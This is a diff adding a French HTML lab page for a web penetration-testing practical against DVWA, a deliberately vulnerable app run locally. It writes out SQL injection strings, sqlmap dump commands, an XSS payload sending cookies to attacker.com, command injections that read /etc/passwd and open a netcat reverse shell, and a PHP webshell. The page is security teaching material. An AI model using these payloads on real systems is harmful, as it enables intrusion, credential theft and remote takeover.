@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TP - Pentest Web (DVWA)</title>
+<style>
+  body { font-family: Arial; margin: 0; background: #f4eaff; line-height: 1.8; }
+  .topbar { background: linear-gradient(135deg, #c59bff, #b07cff); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; color: white; position: sticky; top: 0; }
+  .topbar-title { font-size: 20px; font-weight: bold; }
+  .back-btn { padding: 8px 16px; background: #fff; color: #6a34cc; border-radius: 8px; font-weight: bold; text-decoration: none; }
+  .container { width: 70%; margin: 40px auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); }
+  h1 { color: #4a2db6; border-bottom: 3px solid #e9d6ff; padding-bottom: 15px; }
+  h2 { color: #5b22b3; margin-top: 30px; }
+  .objective { background: #e8f4ff; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #007bff; }
+  .step { background: #f8f4ff; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #6a34cc; }
+  .step-num { background: #6a34cc; color: white; padding: 5px 12px; border-radius: 50%; font-weight: bold; margin-right: 10px; }
+  .code-block { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 8px; font-family: monospace; margin: 15px 0; overflow-x: auto; }
+  .success { background: #d4edda; padding: 20px; border-radius: 10px; margin: 20px 0; }
+  .warning { background: #fff3cd; padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #ffc107; }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-title">🔧 TP - Pentest Web</div>
+  <a href="../audit.html" class="back-btn">← Retour au cours</a>
+</div>
+<div class="container">
+  <h1>🌐 TP : Tests d'Intrusion Web (DVWA)</h1>
+
+  <div class="warning">
+    <strong>⚠️ Environnement légal :</strong> DVWA (Damn Vulnerable Web Application) est une application volontairement vulnérable pour l'apprentissage. Ne jamais tester sur des systèmes sans autorisation.
+  </div>
+
+  <div class="objective">
+    <strong>🎯 Objectifs :</strong>
+    <ul>
+      <li>Installer DVWA</li>
+      <li>Exploiter des vulnérabilités web courantes</li>
+      <li>SQL Injection, XSS, Command Injection</li>
+      <li>Comprendre les mécanismes de protection</li>
+    </ul>
+    <strong>⏱️ Durée :</strong> 3h
+  </div>
+
+  <h2>Partie 1 : Installation</h2>
+
+  <div class="step">
+    <p><span class="step-num">1</span><strong>Installer DVWA avec Docker</strong></p>
+    <div class="code-block"># Télécharger et lancer DVWA
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+# Accéder à http://localhost
+# Login : admin / password</div>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">2</span><strong>Configurer le niveau de sécurité</strong></p>
+    <ul>
+      <li>DVWA Security → Choisir "Low"</li>
+      <li>Commencer par Low, puis Medium, puis High</li>
+    </ul>
+  </div>
+
+  <h2>Partie 2 : SQL Injection</h2>
+
+  <div class="step">
+    <p><span class="step-num">3</span><strong>Tester l'injection SQL (Low)</strong></p>
+    <p>Aller dans "SQL Injection" et tester :</p>
+    <div class="code-block"># Tester la vulnérabilité
+1' OR '1'='1
+
+# Trouver le nombre de colonnes
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+
+# Extraire les données
+1' UNION SELECT user, password FROM users-- -</div>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">4</span><strong>Utiliser SQLmap</strong></p>
+    <div class="code-block"># Récupérer le cookie PHPSESSID depuis le navigateur
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=xxx; security=low" \
+  --dbs
+
+# Extraire les tables
+sqlmap ... -D dvwa --tables
+
+# Extraire les utilisateurs
+sqlmap ... -D dvwa -T users --dump</div>
+  </div>
+
+  <h2>Partie 3 : XSS (Cross-Site Scripting)</h2>
+
+  <div class="step">
+    <p><span class="step-num">5</span><strong>XSS Reflected</strong></p>
+    <div class="code-block"># Payload basique
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# Vol de cookie
+&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</div>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">6</span><strong>XSS Stored</strong></p>
+    <p>Dans le guestbook, injecter un script qui sera exécuté pour tous les visiteurs.</p>
+  </div>
+
+  <h2>Partie 4 : Command Injection</h2>
+
+  <div class="step">
+    <p><span class="step-num">7</span><strong>Injection de commandes</strong></p>
+    <div class="code-block"># Dans le champ IP, tester :
+127.0.0.1; id
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 | whoami
+
+# Reverse shell
+127.0.0.1; nc -e /bin/bash VOTRE_IP 4444</div>
+  </div>
+
+  <h2>Partie 5 : File Upload</h2>
+
+  <div class="step">
+    <p><span class="step-num">8</span><strong>Upload de webshell</strong></p>
+    <p>Créer un fichier shell.php :</p>
+    <div class="code-block">&lt;?php system($_GET['cmd']); ?&gt;</div>
+    <p>L'uploader et accéder à :</p>
+    <div class="code-block">http://localhost/hackable/uploads/shell.php?cmd=id</div>
+  </div>
+
+  <h2>Partie 6 : Augmenter la difficulté</h2>
+
+  <div class="step">
+    <p><span class="step-num">9</span><strong>Passer en Medium puis High</strong></p>
+    <ul>
+      <li>Analyser les protections ajoutées</li>
+      <li>Trouver des contournements (bypass)</li>
+      <li>Comparer le code source (View Source)</li>
+    </ul>
+  </div>
+
+  <div class="success">
+    <strong>✅ Livrables :</strong>
+    <ol>
+      <li>Rapport pour chaque vulnérabilité exploitée</li>
+      <li>Captures d'écran des exploits réussis</li>
+      <li>Comparaison Low vs Medium vs High</li>
+      <li>Recommandations de correction</li>
+    </ol>
+  </div>
+</div>
+</body>
+</html>
+
+
